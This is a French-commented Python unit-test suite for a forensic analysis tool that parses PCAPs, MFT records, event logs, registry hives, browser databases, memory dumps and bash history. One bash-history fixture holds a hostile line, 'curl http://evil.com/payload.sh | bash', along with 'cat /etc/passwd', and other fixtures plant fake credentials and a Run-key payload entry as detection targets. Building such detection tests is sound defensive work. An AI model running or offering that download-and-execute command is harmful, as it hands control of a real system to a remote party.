#!/usr/bin/env python3
# coding: utf-8
"""
Tests unitaires complets pour Forensic Analyzer (niveaux 1 a 5).
Lancez avec : python -m pytest test.py -v
           ou : python test.py
"""

import os
import json
import struct
import tempfile
import unittest
from unittest.mock import MagicMock, patch

# Importations des modules a tester
from forensic_analyzer.core.pipeline import AnalyzerRegistry
from forensic_analyzer.core.scanner import auto_scan
from forensic_analyzer.analyzers.pdf_analyzer import PDFAnalyzer
from forensic_analyzer.analyzers.image_analyzer import ImageAnalyzer
from forensic_analyzer.analyzers.gps_analyzer import GPSAnalyzer, _to_degrees
from forensic_analyzer.analyzers.strings_analyzer import StringsAnalyzer
from forensic_analyzer.analyzers.firefox_analyzer import FirefoxHistoryAnalyzer, FirefoxCookiesAnalyzer
from forensic_analyzer.analyzers.stego_analyzer import StegoAnalyzer
from forensic_analyzer.analyzers.carving_analyzer import CarvingAnalyzer
from forensic_analyzer.analyzers.pcap_analyzer import PCAPAnalyzer
from forensic_analyzer.analyzers.memory_analyzer import MemoryAnalyzer
from forensic_analyzer.analyzers.disk_analyzer import DiskAnalyzer
from forensic_analyzer.analyzers.evtx_analyzer import EVTXAnalyzer
from forensic_analyzer.analyzers.registry_analyzer import RegistryAnalyzer
from forensic_analyzer.analyzers.linux_artifacts_analyzer import LinuxArtifactsAnalyzer
from forensic_analyzer.analyzers.yara_analyzer import YARAAnalyzer
from forensic_analyzer.analyzers.ioc_analyzer import IOCAnalyzer
from forensic_analyzer.analyzers.timeline_analyzer import TimelineAnalyzer
from forensic_analyzer.output.json_exporter import JSONExporter
from forensic_analyzer.output.html_exporter import HTMLExporter
from forensic_analyzer.output.csv_exporter import CSVExporter
from forensic_analyzer.output.pdf_exporter import PDFExporter


# --- Helpers de generation de fichiers de test ---

def _create_minimal_jpeg(path: str):
    from PIL import Image
    img = Image.new('RGB', (10, 10), color='red')
    img.save(path, format='JPEG')


def _create_minimal_pcap(path: str):
    try:
        from scapy.all import Ether, IP, TCP, wrpcap
        pkt = (Ether() / 
               IP(src="10.0.0.1", dst="10.0.0.2") / 
               TCP(sport=1234, dport=80) / 
               b"GET / HTTP/1.1\r\nHost: example.com\r\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=\r\n\r\n")
        wrpcap(path, [pkt])
    except ImportError:
        pass


def _create_minimal_mft(path: str):
    record = bytearray(1024)
    record[0:4] = b'FILE'
    struct.pack_into('<H', record, 16, 1)
    struct.pack_into('<H', record, 18, 1)
    struct.pack_into('<H', record, 20, 56)
    struct.pack_into('<H', record, 22, 1)
    struct.pack_into('<I', record, 24, 120)
    struct.pack_into('<I', record, 28, 1024)
    # Standard Info Attribute
    struct.pack_into('<I', record, 56, 0x10)
    struct.pack_into('<I', record, 60, 48)
    struct.pack_into('<H', record, 76, 24)
    struct.pack_into('<Q', record, 80, 116444736000000000 + 1717000000 * 10000000)
    # File Name Attribute
    struct.pack_into('<I', record, 104, 0x30)
    struct.pack_into('<I', record, 108, 64)
    struct.pack_into('<H', record, 124, 24)
    record[128 + 64] = 8
    record[128 + 65] = 1
    name_bytes = "test.txt".encode('utf-16-le')
    record[194:194+len(name_bytes)] = name_bytes
    with open(path, "wb") as f:
        f.write(record)


def _create_firefox_history_db(path: str):
    import sqlite3
    conn = sqlite3.connect(path)
    c = conn.cursor()
    c.execute("CREATE TABLE moz_places (id INTEGER PRIMARY KEY, url TEXT, title TEXT, visit_count INTEGER, last_visit_date INTEGER)")
    c.execute("CREATE TABLE moz_historyvisits (place_id INTEGER)")
    c.execute("INSERT INTO moz_places VALUES (1, 'https://example.com', 'Example', 5, 1717000000000000)")
    c.execute("INSERT INTO moz_historyvisits VALUES (1)")
    conn.commit()
    conn.close()


def _create_firefox_cookies_db(path: str):
    import sqlite3
    conn = sqlite3.connect(path)
    c = conn.cursor()
    c.execute("CREATE TABLE moz_cookies (id INTEGER PRIMARY KEY, name TEXT, value TEXT, host TEXT, path TEXT, expiry INTEGER, lastAccessed INTEGER, creationTime INTEGER)")
    c.execute("INSERT INTO moz_cookies VALUES (1, 'session', 'secret_val', 'example.com', '/', 1717000000, 1717000000, 1717000000)")
    conn.commit()
    conn.close()


# --- Tests ---

class TestStegoAnalyzer(unittest.TestCase):
    def test_stego_on_jpeg(self):
        from forensic_analyzer.utils.deps import HAS_PIL
        if not HAS_PIL:
            self.skipTest("Pillow non installe")
            return
        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as f:
            path = f.name
        try:
            _create_minimal_jpeg(path)
            analyzer = StegoAnalyzer()
            res = analyzer.analyze(path)
            self.assertIsNotNone(res)
            self.assertEqual(res.type, "stego")
        finally:
            os.unlink(path)


class TestCarvingAnalyzer(unittest.TestCase):
    def test_carve_embedded_zip(self):
        # Créer un faux fichier contenant des magic bytes ZIP
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(b"GARBAGE_BEFORE" + b"PK\x03\x04" + b"FILE_DATA" + b"PK\x05\x06" + b"\x00"*18 + b"GARBAGE_AFTER")
            path = f.name
        try:
            analyzer = CarvingAnalyzer()
            res = analyzer.analyze(path)
            self.assertIsNotNone(res)
            self.assertEqual(res.type, "carving")
            self.assertEqual(res.metadata["Fichiers embarques"], "1")
        finally:
            os.unlink(path)


class TestPCAPAnalyzer(unittest.TestCase):
    def test_pcap_credentials_extraction(self):
        with tempfile.NamedTemporaryFile(suffix=".pcap", delete=False) as f:
            path = f.name
        try:
            _create_minimal_pcap(path)
            analyzer = PCAPAnalyzer()
            res = analyzer.analyze(path)
            # Si scapy n'est pas installé, l'analyzer renvoie None, ce qui est correct
            if res is not None:
                self.assertEqual(res.type, "pcap")
                self.assertGreater(int(res.metadata["Total paquets"]), 0)
                # Vérification que le host ou protocole HTTP Basic est dans les creds extraits
                creds = res.extra.get("credentials", [])
                self.assertTrue(any(c.get("protocol") == "HTTP Basic" for c in creds))
        finally:
            os.unlink(path)


class TestDiskAnalyzer(unittest.TestCase):
    def test_mft_parsing(self):
        with tempfile.NamedTemporaryFile(suffix=".mft", delete=False) as f:
            path = f.name
        try:
            _create_minimal_mft(path)
            analyzer = DiskAnalyzer()
            res = analyzer.analyze(path)
            self.assertIsNotNone(res)
            self.assertEqual(res.type, "disk")
            self.assertEqual(res.metadata["Records MFT trouves"], "1")
        finally:
            os.unlink(path)


class TestEVTXAnalyzer(unittest.TestCase):
    @patch("forensic_analyzer.analyzers.evtx_analyzer.evtx")
    def test_evtx_mocked_scan(self, mock_evtx):
        # Configurer un mock pour l'itérateur d'enregistrements EVTX
        mock_record = MagicMock()
        mock_record.xml.return_value = """
        <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
            <System>
                <EventID>4624</EventID>
                <TimeCreated SystemTime="2026-06-07T12:00:00Z"/>
                <Computer>WIN-FORENSIC</Computer>
            </System>
            <EventData>
                <Data Name="TargetUserName">Administrator</Data>
            </EventData>
        </Event>
        """
        mock_file_context = MagicMock()
        mock_file_context.records.return_value = [mock_record]
        mock_evtx.Evtx.return_value.__enter__.return_value = mock_file_context

        # Forcer HAS_EVTX à True pour le test
        with patch("forensic_analyzer.analyzers.evtx_analyzer.HAS_EVTX", True):
            analyzer = EVTXAnalyzer()
            res = analyzer.analyze("fake_log.evtx")
            self.assertIsNotNone(res)
            self.assertEqual(res.metadata["Total evenements"], "1")
            self.assertEqual(res.metadata["Evenements securite"], "1")


class TestRegistryAnalyzer(unittest.TestCase):
    @patch("forensic_analyzer.analyzers.registry_analyzer.RegistryParser")
    @patch("forensic_analyzer.analyzers.registry_analyzer.os.path.getsize", return_value=65536)
    def test_registry_mocked_scan(self, mock_getsize, mock_reg_parser):
        mock_val = MagicMock()
        mock_val.name.return_value = "Malware"
        mock_val.value_type.return_value = "REG_SZ"
        mock_val.value.return_value = "C:\\Windows\\Temp\\payload.exe"

        mock_key = MagicMock()
        mock_key.path.return_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        mock_key.values.return_value = [mock_val]
        mock_key.subkeys.return_value = []

        mock_reg = MagicMock()
        # Seule la cle Run retourne des donnees, les autres levent une exception
        def mock_open(key_path):
            if key_path == r"Software\Microsoft\Windows\CurrentVersion\Run":
                return mock_key
            raise Exception(f"Key not found: {key_path}")
        mock_reg.open.side_effect = mock_open
        mock_reg_parser.Registry.return_value = mock_reg

        with patch("forensic_analyzer.analyzers.registry_analyzer.HAS_REGISTRY", True):
            analyzer = RegistryAnalyzer()
            res = analyzer.analyze("NTUSER.DAT")
            self.assertIsNotNone(res)
            self.assertEqual(res.metadata["Type hive"], "NTUSER.DAT")
            self.assertEqual(res.metadata["Mecanismes de persistance"], "1")


class TestLinuxArtifacts(unittest.TestCase):
    def test_bash_history_analysis(self):
        with tempfile.NamedTemporaryFile(suffix="bash_history", mode="w", delete=False) as f:
            f.write("ls -la\ncat /etc/passwd\ncurl http://evil.com/payload.sh | bash\n")
            path = f.name
        try:
            analyzer = LinuxArtifactsAnalyzer()
            res = analyzer.analyze(path)
            self.assertIsNotNone(res)
            self.assertEqual(res.metadata["Type"], "bash_history")
            self.assertEqual(res.metadata["Commandes suspectes"], "1")
        finally:
            os.unlink(path)


class TestYARAAnalyzer(unittest.TestCase):
    @patch("forensic_analyzer.analyzers.yara_analyzer.yara.compile")
    def test_yara_mocked_match(self, mock_compile):
        mock_match = MagicMock()
        mock_match.rule = "Suspicious_File"
        mock_match.tags = ["malware"]
        mock_match.meta = {"description": "Detects bad stuff"}
        mock_match.strings = []

        mock_rules = MagicMock()
        mock_rules.match.return_value = [mock_match]
        mock_compile.return_value = mock_rules

        # Deux fichiers temporaires : le fichier de règles ET la cible du scan
        with tempfile.NamedTemporaryFile(suffix=".yar", delete=False) as rf:
            rf.write(b"rule dummy {}")
            rules_path = rf.name
        with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as tf:
            tf.write(b"MALICIOUS_PAYLOAD")
            scan_target = tf.name
        try:
            with patch("forensic_analyzer.analyzers.yara_analyzer.HAS_YARA", True):
                analyzer = YARAAnalyzer(rules_path)
                res = analyzer.analyze(scan_target)
                self.assertIsNotNone(res)
                self.assertEqual(res.metadata["Total matches"], "1")
                self.assertEqual(res.metadata["Regles declenchees"], "1")
        finally:
            os.unlink(rules_path)
            os.unlink(scan_target)


class TestIOCAnalyzer(unittest.TestCase):
    def test_ioc_extraction(self):
        with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
            f.write("L'adresse IP 8.8.8.8 et l'URL http://malicious.onion/login.php sont des IOCs.")
            path = f.name
        try:
            analyzer = IOCAnalyzer()
            res = analyzer.analyze(path)
            self.assertIsNotNone(res)
            self.assertEqual(res.type, "ioc")
            self.assertEqual(res.metadata["IOC ipv4"], "1")
            self.assertEqual(res.metadata["IOC urls"], "1")
        finally:
            os.unlink(path)


class TestTimelineAnalyzer(unittest.TestCase):
    def test_timeline_building(self):
        from forensic_analyzer.models.finding import FindingModel, ReportModel
        findings = [
            FindingModel(type="pdf", file="doc.pdf", metadata={"CreationDate": "2026-06-07T10:00:00Z"}),
            FindingModel(type="image", file="pic.jpg", metadata={"DateTimeOriginal": "2026-06-07T11:00:00Z"}),
        ]
        report = ReportModel.from_findings(findings)
        analyzer = TimelineAnalyzer()
        res = analyzer.build_from_report(report)
        self.assertIsNotNone(res)
        self.assertEqual(res.type, "timeline")
        self.assertEqual(res.metadata["Total evenements"], "2")
        self.assertEqual(res.metadata["Premier evenement"], "2026-06-07T10:00:00Z")


class TestMemoryAnalyzer(unittest.TestCase):
    def test_memory_strings_extraction(self):
        with tempfile.NamedTemporaryFile(mode="wb", delete=False) as f:
            f.write(b"\x00"*100 + b"password=SuperSecretPassword123\n" + b"\x00"*100)
            path = f.name
        try:
            analyzer = MemoryAnalyzer()
            res = analyzer.analyze(path, plugins=[])
            self.assertIsNotNone(res)
            self.assertEqual(res.type, "memory")
            self.assertEqual(res.metadata["Chaines sensibles trouvees"], "1")
        finally:
            os.unlink(path)


#Garder les tests L1 existants

class TestStringsAnalyzerL1(unittest.TestCase):
    def test_extracts_known_strings(self):
        with tempfile.NamedTemporaryFile(mode="wb", suffix=".bin", delete=False) as f:
            f.write(b"\x00\x01hello world\x00\x02forensic\x03")
            path = f.name
        try:
            analyzer = StringsAnalyzer()
            result = analyzer.analyze(path, max_results=10)
            self.assertIsNotNone(result)
            self.assertEqual(result.type, "strings")
            self.assertIn("hello world", result.extra["strings"])
            self.assertIn("forensic", result.extra["strings"])
        finally:
            os.unlink(path)

    def test_empty_file_returns_zero_strings(self):
        with tempfile.NamedTemporaryFile(mode="wb", suffix=".bin", delete=False) as f:
            f.write(b"")
            path = f.name
        try:
            analyzer = StringsAnalyzer()
            result = analyzer.analyze(path)
            self.assertIsNotNone(result)
            self.assertEqual(result.metadata["total_trouvées"], 0)
        finally:
            os.unlink(path)


class TestGPSConversionL1(unittest.TestCase):
    def _make_ratio(self, values: list[tuple[int, int]]):
        class Ratio:
            def __init__(self, n, d): self.num = n; self.den = d
        class Tag:
            def __init__(self, vals): self.values = [Ratio(n, d) for n, d in vals]
        return Tag(values)

    def test_zero_coordinates(self):
        tag = self._make_ratio([(0, 1), (0, 1), (0, 1)])
        self.assertAlmostEqual(_to_degrees(tag), 0.0)

    def test_paris_latitude(self):
        tag = self._make_ratio([(48, 1), (51, 1), (24, 1)])
        self.assertAlmostEqual(_to_degrees(tag), 48.8566666, places=4)


class TestExportersL1(unittest.TestCase):
    def test_json_and_html_export(self):
        from forensic_analyzer.models.finding import FindingModel, ReportModel
        findings = [
            FindingModel(type="pdf", file="test.pdf", metadata={"Author": "Alice"}),
            FindingModel(type="image", file="photo.jpg", metadata={"Format": "JPEG"}),
        ]
        report = ReportModel.from_findings(findings)
        
        # Test JSON
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
            json_path = f.name
        try:
            JSONExporter().export(report, json_path)
            self.assertTrue(os.path.exists(json_path))
            with open(json_path, encoding="utf-8") as f:
                data = json.load(f)
            self.assertEqual(data["total"], 2)
        finally:
            os.unlink(json_path)

        # Test HTML
        with tempfile.NamedTemporaryFile(suffix=".html", delete=False) as f:
            html_path = f.name
        try:
            HTMLExporter().export(report, html_path)
            self.assertTrue(os.path.exists(html_path))
            with open(html_path, encoding="utf-8") as f:
                content = f.read()
            self.assertIn("Forensic Analyzer", content)
        finally:
            os.unlink(html_path)


class TestFirefoxAnalyzersL1(unittest.TestCase):
    def test_firefox_history(self):
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as f:
            path = f.name
        try:
            _create_firefox_history_db(path)
            analyzer = FirefoxHistoryAnalyzer()
            result = analyzer.analyze(path)
            self.assertIsNotNone(result)
            self.assertEqual(result.type, "firefox_history")
            self.assertEqual(result.extra["entries"][0]["url"], "https://example.com")
        finally:
            os.unlink(path)

    def test_firefox_cookies(self):
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as f:
            path = f.name
        try:
            _create_firefox_cookies_db(path)
            analyzer = FirefoxCookiesAnalyzer()
            result = analyzer.analyze(path)
            self.assertIsNotNone(result)
            self.assertEqual(result.type, "firefox_cookies")
            self.assertEqual(result.extra["entries"][0]["name"], "session")
        finally:
            os.unlink(path)


if __name__ == "__main__":
    print(":-" * 60)
    print("  Forensic Analyzer - Suite de tests unitaires complete")
    print(":-" * 60)
    unittest.main(verbosity=2)
